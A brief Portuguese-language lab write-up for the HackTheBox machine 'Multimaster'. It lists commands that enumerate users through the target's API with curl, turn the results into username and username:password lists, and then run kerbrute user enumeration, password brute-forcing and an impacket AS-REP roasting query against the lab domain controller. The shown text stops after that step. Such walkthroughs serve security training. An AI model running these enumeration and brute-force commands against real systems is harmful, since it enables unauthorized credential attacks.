Multimaster
========================

Obtendo usuários:

    for i in {a..z}; do curl -X POST --json "{\"name\":\"$i\"}" http://multimaster.htb/api/getColleagues; done > teste.txt
    
    cat teste.txt | sed 's/,/\n/g' | grep email | cut -d ":" -f 2 | sed 's/\"//g' > emails.txt

    cat emails.txt | cut -d '@' -f 1 > users.txt
    
    awk {'print $1":"$1'} users.txt > credentials.txt
 
Após obter alguns usuários válidos do sistema, tentamos alguma abordagens:

Aqui validamos alguns usuários na base kerberos:

    kerbrute userenum -d MEGACORP.LOCAL --dc 10.10.10.179 users.txt
    
    kerbrute bruteforce -d MEGACORP.LOCAL --dc 10.10.10.179 credentials.txt
    
Sem sucesso

    impacket-GetNPUsers -dc-ip 10.10.10.179 MEGACORP.LOCAL/ -usersfile users.txt
 
 
